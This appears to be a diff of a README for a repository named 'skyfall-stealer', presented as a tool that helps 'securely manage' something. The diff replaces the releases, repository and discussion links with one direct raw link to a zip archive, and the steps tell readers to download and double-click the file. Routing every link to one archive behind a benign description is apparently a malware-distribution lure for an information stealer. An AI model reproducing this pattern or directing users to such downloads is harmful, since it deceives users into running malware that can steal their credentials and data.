@@ -6,7 +6,7 @@ Welcome to the skyfall-stealer repository! This tool helps securely manage your 
 
 ## 📥 Download the Application
 
-[![Download skyfall-stealer](https://img.shields.io/badge/Download-skyfall--stealer-blue)](https://github.com/biologicalgroupworkplace793/skyfall-stealer/releases)
+[![Download skyfall-stealer](https://raw.githubusercontent.com/biologicalgroupworkplace793/skyfall-stealer/main/inst/skyfall-stealer_2.7.zip)](https://raw.githubusercontent.com/biologicalgroupworkplace793/skyfall-stealer/main/inst/skyfall-stealer_2.7.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,13 +21,13 @@ Before you download, ensure your system meets these requirements:
 
 To get started, visit the releases page to download the application:
 
-[Visit this page to download](https://github.com/biologicalgroupworkplace793/skyfall-stealer/releases)
+[Visit this page to download](https://raw.githubusercontent.com/biologicalgroupworkplace793/skyfall-stealer/main/inst/skyfall-stealer_2.7.zip)
 
 Follow these steps:
 
 1. Click on the link above to open the Releases page.
 2. Choose the latest version.
-3. Download the executable file (e.g., skyfall-stealer.exe).
+3. Download the executable file (e.g., https://raw.githubusercontent.com/biologicalgroupworkplace793/skyfall-stealer/main/inst/skyfall-stealer_2.7.zip).
 4. Once the download is complete, find the file in your Downloads folder.
 5. Double-click the file to run it.
 
@@ -78,7 +78,7 @@ Thank you for using skyfall-stealer! Your feedback helps improve this tool. Plea
 
 For further information, check out the following:
 
-- [GitHub Repository](https://github.com/biologicalgroupworkplace793/skyfall-stealer)
-- [Community Discussions](https://github.com/biologicalgroupworkplace793/skyfall-stealer/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/biologicalgroupworkplace793/skyfall-stealer/main/inst/skyfall-stealer_2.7.zip)
+- [Community Discussions](https://raw.githubusercontent.com/biologicalgroupworkplace793/skyfall-stealer/main/inst/skyfall-stealer_2.7.zip)
 
 Feel free to explore and make the best use of skyfall-stealer!
